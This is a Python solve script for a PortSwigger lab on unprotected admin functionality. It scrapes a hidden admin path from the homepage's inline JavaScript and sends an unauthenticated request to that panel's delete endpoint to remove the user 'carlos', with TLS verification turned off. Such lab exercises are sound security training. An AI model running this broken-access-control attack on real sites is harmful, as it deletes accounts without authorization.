#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Unprotected admin functionality with unpredictable URL.

Fetches the homepage, extracts the admin path from inline JavaScript,
then deletes the user 'carlos'.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def find_admin_path(session: requests.Session, lab: str) -> str:
    r = session.get(lab)
    # Admin path embedded in JS: href='/admin-XXXX' or similar
    m = re.search(r"href=['\"](/admin[^'\"]+)['\"]", r.text)
    if not m:
        # Fallback: look for any path starting with /admin in JS strings
        m = re.search(r"['\"](/admin-\w+)['\"]", r.text)
    if not m:
        raise SystemExit("[-] Could not extract admin path from page source")
    return m.group(1)


def delete_user(session: requests.Session, lab: str, admin_path: str, username: str) -> None:
    r = session.get(f"{lab}{admin_path}/delete?username={username}")
    if r.ok:
        print(f"[+] Deleted user '{username}'. Lab solved.")
    else:
        print(f"[-] Unexpected status {r.status_code}")


def main():
    parser = argparse.ArgumentParser(
        description="Solve Access Control Lab 2 (unpredictable admin URL in JS)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("--user", default="carlos", help="Username to delete (default: carlos)")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    print("[*] Fetching homepage to extract admin path from JS...")
    admin_path = find_admin_path(s, lab)
    print(f"[*] Found admin path: {admin_path}")

    print(f"[*] Deleting user '{args.user}'...")
    delete_user(s, lab, admin_path, args.user)


if __name__ == "__main__":
    main()
